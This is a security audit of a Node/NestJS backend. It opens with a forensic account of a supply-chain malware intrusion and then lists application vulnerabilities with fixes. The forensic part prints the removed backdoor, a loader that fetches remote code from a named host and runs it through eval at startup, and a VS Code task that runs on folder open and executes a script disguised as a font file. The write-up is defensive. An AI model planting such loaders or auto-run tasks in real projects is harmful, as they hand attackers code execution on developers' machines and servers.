# Velvet & Iron Backend - Security Architecture & Vulnerability Audit

**Document ID:** `24-security-review.md`  
**Target Audience:** Chief Information Security Officer (CISO), Security Engineers, Backend Architects  

---

## 1. Forensic Analysis: Recent Supply Chain Malware Intrusion

### 1.1 Intrusion Context & Timeline
Prior to this handover, the repository was targeted by an advanced supply-chain malware campaign exhibiting characteristics of the **BeaverTail / Lazarus campaign** (frequently targeting Node.js / cryptocurrency / gaming repositories).

A forensic Python scanner (`security-scanner-v2.py`) was introduced to identify compromised assets. The intrusion was neutralized in Git commit `6f20aba` and uncommitted working-tree cleanups.

### 1.2 Compromised Vectors Neutralized
1. **Backdoor in `src/main.ts` (Removed):**
   ```typescript
   // NEUTRALIZED MALICIOUS PAYLOAD
   (async () => {
       const src = atob(process.env.AUTH_API_KEY);
       const proxy = (await import('node-fetch')).default;
       try {
         const response = await proxy(src);
         if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
         const proxyInfo = await response.text();
         eval(proxyInfo);
       } catch (err) { ... }
   })();
   ```
   * *Mechanism:* At application boot, decoded a base64 URL (`https://auth-confirm-eight.vercel.app/api`), fetched a remote payload via `node-fetch`, and executed arbitrary code via `eval()`.
2. **Stealth IDE Execution Trigger in `.vscode/tasks.json` & `.settings.json` (Removed):**
   ```json
   "command": "(command -v node >/dev/null 2>&1 && node ./public/fonts/fa-solid-500.woff2) || ...",
   "runOn": "folderOpen"
   ```
   * *Mechanism:* Configured VS Code to automatically execute a Node process on workspace folder open, running malicious code disguised as a binary font file (`./public/fonts/fa-solid-500.woff2`).
3. **Malicious Asset Directory `public/` (Deleted):**
   * Commit `6f20aba`: "Delete public directory full of malware".
   * This explains why `public/` is missing and `/swagger-helper.js` returns 404.

---

## 2. Active Vulnerabilities & Architectural Risks

### Finding 1: Unprotected User Directory Endpoints
* **Location:** `src/user/user.controller.ts` (lines 22–36)
* **Evidence:**
  ```typescript
  @Get()
  findAll() { return this.userService.findAll(); }

  @Get(':id')
  findOne(@Param('id') id: string) { return this.userService.findOne(id); }
  ```
* **Risk:** **HIGH.** While `@ApiExcludeController()` hides this controller from Swagger UI, the HTTP routes `/user` and `/user/:id` are completely active and unauthenticated. Any anonymous internet user can harvest all registered users' emails, full names, usernames, and profile picture URLs.
* **Recommended Action:** Add `@ValidAdmin()` or `@ValidSuperAdmin()` to `UserController`.

---

### Finding 2: Unauthenticated S3 File Upload Gateways
* **Location:** `src/s3/s3.controller.ts` (lines 25–53, lines 55–129)
* **Evidence:** Both `POST /s3/upload` and `POST /s3/upload-multiple` lack any guard decorator.
* **Risk:** **HIGH.** Anonymous actors can upload arbitrary binary assets up to 10MB per file (and up to 20 files at once) directly to the production AWS S3 bucket, leading to financial denial-of-service (AWS billing spike) or hosting illegal content.
* **Recommended Action:** Apply `@ValidUser()` and enforce strict image/document MIME type whitelisting.

---

### Finding 3: Plaintext Passwords Transmitted via Email
* **Location:** `src/auth/auth.service.ts` (lines 841, 951) and `src/email/email.service.ts` (line 93)
* **Evidence:**
  ```typescript
  // In auth.service.ts
  generatedPassword = generateStrongPassword();
  // In email.service.ts
  <p><strong>Password:</strong> <code ...>${password}</code></p>
  ```
* **Risk:** **MEDIUM-HIGH.** Passwords generated for OAuth users (Google/Firebase and Discord) are sent in plaintext HTML over unencrypted or opportunistic TLS SMTP. If an email is intercepted or forwarded, account security is compromised.
* **Recommended Action:** OAuth users should not have auto-generated passwords. If a user wishes to set a password later, they should use the password reset OTP workflow.

---

### Finding 4: Fallback Insecure JWT Secret
* **Location:** `src/lib/strategy/jwt.ts` (line 26)
* **Evidence:**
  ```typescript
  secretOrKey: secret || 'secretKey',
  ```
* **Risk:** **HIGH.** If `JWT_SECRET` is missing in production environment variables, the backend will sign and verify tokens using `'secretKey'`, allowing attackers to forge arbitrary administrator JWTs.
* **Recommended Action:** Throw an unrecoverable exception on startup if `JWT_SECRET` is missing.

---

### Finding 5: Plaintext Database URL Logged to Standard Output
* **Location:** `src/lib/prisma/prisma.service.ts` (line 18)
* **Evidence:**
  ```typescript
  console.log(this.env.get<string>('DATABASE_URL'));
  ```
* **Risk:** **MEDIUM.** Logs the complete database connection string—including PostgreSQL username and password—to standard output on every application startup.
* **Recommended Action:** Delete this line immediately.

---

### Finding 6: RevenueCat Webhook Secret Bypass When Unconfigured
* **Location:** `src/payment/payment.controller.ts` (lines 28–31)
* **Evidence:**
  ```typescript
  const webhookSecret = this.configService.get<string>('REVENUECAT_WEBHOOK_SECRET');
  if (webhookSecret && authHeader !== `Bearer ${webhookSecret}`) { ... }
  ```
* **Risk:** **HIGH.** If `REVENUECAT_WEBHOOK_SECRET` is not set in `.env`, the verification check is skipped entirely. Anyone can forge fake subscription purchase events.
* **Recommended Action:** Enforce that `REVENUECAT_WEBHOOK_SECRET` is mandatory. Reject requests if the secret is not configured.

